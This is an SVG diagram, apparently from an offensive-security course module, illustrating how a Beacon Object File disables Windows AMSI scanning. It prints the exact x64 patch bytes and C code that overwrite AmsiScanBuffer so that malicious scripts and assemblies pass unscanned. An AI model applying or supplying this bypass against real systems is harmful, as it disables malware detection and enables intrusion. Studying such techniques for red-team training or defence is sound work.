@@ -1,0 +1,88 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 580" font-family="'Segoe UI', Consolas, monospace">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0d1117"/><stop offset="100%" stop-color="#161b22"/></linearGradient>
+    <marker id="ar" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#f0883e"/></marker>
+  </defs>
+  <rect width="1000" height="580" fill="url(#bg)"/>
+  <text x="500" y="30" text-anchor="middle" fill="#58a6ff" font-size="17" font-weight="bold">AMSI Bypass from BOF — Disabling Scan Interface</text>
+
+  <!-- AMSI flow before -->
+  <rect x="20" y="55" width="470" height="200" rx="8" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
+  <text x="255" y="80" text-anchor="middle" fill="#f85149" font-size="12" font-weight="bold">Before: AMSI Scanning Active</text>
+
+  <rect x="40" y="95" width="120" height="40" rx="4" fill="#161b22" stroke="#58a6ff" stroke-width="1"/>
+  <text x="100" y="120" text-anchor="middle" fill="#58a6ff" font-size="9">Script/Assembly</text>
+
+  <line x1="160" y1="115" x2="190" y2="115" stroke="#f85149" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="195" y="95" width="130" height="40" rx="4" fill="#161b22" stroke="#f85149" stroke-width="1.5"/>
+  <text x="260" y="115" text-anchor="middle" fill="#f85149" font-size="9">AmsiScanBuffer</text>
+  <text x="260" y="130" text-anchor="middle" fill="#8b949e" font-size="7">amsi.dll</text>
+
+  <line x1="325" y1="115" x2="355" y2="115" stroke="#f85149" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="360" y="95" width="110" height="40" rx="4" fill="#161b22" stroke="#f85149" stroke-width="1.5"/>
+  <text x="415" y="115" text-anchor="middle" fill="#f85149" font-size="9">AV Engine</text>
+  <text x="415" y="130" text-anchor="middle" fill="#8b949e" font-size="7">signature match</text>
+
+  <line x1="415" y1="135" x2="415" y2="155" stroke="#f85149" stroke-width="1"/>
+  <rect x="340" y="160" width="140" height="30" rx="4" fill="#f85149" fill-opacity="0.2" stroke="#f85149" stroke-width="1.5"/>
+  <text x="410" y="180" text-anchor="middle" fill="#f85149" font-size="9">AMSI_RESULT_DETECTED</text>
+
+  <line x1="100" y1="135" x2="100" y2="200" stroke="#f85149" stroke-width="1"/>
+  <rect x="40" y="200" width="200" height="30" rx="4" fill="#f85149" fill-opacity="0.15" stroke="#f85149" stroke-width="1"/>
+  <text x="140" y="220" text-anchor="middle" fill="#f85149" font-size="9">Execution BLOCKED</text>
+
+  <!-- AMSI flow after -->
+  <rect x="510" y="55" width="470" height="200" rx="8" fill="#0d1117" stroke="#3fb950" stroke-width="2"/>
+  <text x="745" y="80" text-anchor="middle" fill="#3fb950" font-size="12" font-weight="bold">After: AMSI Patched</text>
+
+  <rect x="530" y="95" width="120" height="40" rx="4" fill="#161b22" stroke="#58a6ff" stroke-width="1"/>
+  <text x="590" y="120" text-anchor="middle" fill="#58a6ff" font-size="9">Script/Assembly</text>
+
+  <line x1="650" y1="115" x2="680" y2="115" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="685" y="95" width="150" height="40" rx="4" fill="#161b22" stroke="#3fb950" stroke-width="1.5"/>
+  <text x="760" y="115" text-anchor="middle" fill="#3fb950" font-size="9">AmsiScanBuffer</text>
+  <text x="760" y="130" text-anchor="middle" fill="#7ee787" font-size="7">PATCHED - instant return</text>
+
+  <line x1="760" y1="135" x2="760" y2="165" stroke="#3fb950" stroke-width="1"/>
+  <rect x="680" y="168" width="160" height="30" rx="4" fill="#3fb950" fill-opacity="0.2" stroke="#3fb950" stroke-width="1.5"/>
+  <text x="760" y="188" text-anchor="middle" fill="#3fb950" font-size="9">AMSI_RESULT_CLEAN</text>
+
+  <line x1="590" y1="135" x2="590" y2="215" stroke="#3fb950" stroke-width="1"/>
+  <rect x="530" y="218" width="200" height="30" rx="4" fill="#3fb950" fill-opacity="0.15" stroke="#3fb950" stroke-width="1"/>
+  <text x="630" y="238" text-anchor="middle" fill="#3fb950" font-size="9">Execution ALLOWED</text>
+
+  <!-- Patch details -->
+  <rect x="20" y="275" width="960" height="170" rx="8" fill="#0d1117" stroke="#f0883e" stroke-width="1.5"/>
+  <text x="500" y="300" text-anchor="middle" fill="#f0883e" font-size="13" font-weight="bold">Patch Implementation</text>
+
+  <rect x="40" y="315" width="450" height="110" rx="4" fill="#161b22" stroke="#f0883e" stroke-width="1"/>
+  <text x="265" y="335" text-anchor="middle" fill="#f0883e" font-size="10" font-weight="bold">Patch Bytes (x64)</text>
+  <text x="55" y="360" fill="#3fb950" font-size="10" font-family="Consolas">B8 57 00 07 80   mov eax, 0x80070057</text>
+  <text x="55" y="380" fill="#3fb950" font-size="10" font-family="Consolas">C3               ret</text>
+  <text x="55" y="405" fill="#8b949e" font-size="9">0x80070057 = E_INVALIDARG (HRESULT)</text>
+  <text x="55" y="420" fill="#8b949e" font-size="8">Function returns error, caller treats as AMSI_RESULT_CLEAN</text>
+
+  <rect x="510" y="315" width="450" height="110" rx="4" fill="#161b22" stroke="#58a6ff" stroke-width="1"/>
+  <text x="735" y="335" text-anchor="middle" fill="#58a6ff" font-size="10" font-weight="bold">BOF Code</text>
+  <text x="525" y="358" fill="#c9d1d9" font-size="8" font-family="Consolas">HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");</text>
+  <text x="525" y="375" fill="#c9d1d9" font-size="8" font-family="Consolas">void* pScan = KERNEL32$GetProcAddress(hAmsi,</text>
+  <text x="525" y="390" fill="#c9d1d9" font-size="8" font-family="Consolas">                        "AmsiScanBuffer");</text>
+  <text x="525" y="408" fill="#f0883e" font-size="8" font-family="Consolas">BYTE patch[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};</text>
+  <text x="525" y="423" fill="#f0883e" font-size="8" font-family="Consolas">VirtualProtect(pScan, 6, PAGE_RW, &amp;old);</text>
+  <text x="525" y="438" fill="#f85149" font-size="8" font-family="Consolas">memcpy(pScan, patch, 6);</text>
+
+  <!-- Affected components -->
+  <rect x="20" y="460" width="960" height="80" rx="6" fill="#0d1117" stroke="#58a6ff" stroke-width="1"/>
+  <text x="500" y="485" text-anchor="middle" fill="#58a6ff" font-size="11" font-weight="bold">Components Affected by AMSI Patch</text>
+  <text x="130" y="510" text-anchor="middle" fill="#8b949e" font-size="9">PowerShell scripts</text>
+  <text x="320" y="510" text-anchor="middle" fill="#8b949e" font-size="9">.NET assemblies (execute-assembly)</text>
+  <text x="530" y="510" text-anchor="middle" fill="#8b949e" font-size="9">VBScript / JScript</text>
+  <text x="730" y="510" text-anchor="middle" fill="#8b949e" font-size="9">Office VBA macros</text>
+  <text x="900" y="510" text-anchor="middle" fill="#8b949e" font-size="9">WMI scripts</text>
+  <text x="500" y="530" text-anchor="middle" fill="#f85149" font-size="8">Patch is per-process. Must be applied before loading malicious content.</text>
+
+  <text x="500" y="570" text-anchor="middle" fill="#58a6ff" font-size="10">CRTLP Module 09 — AMSI Bypass via BOF</text>
+</svg>
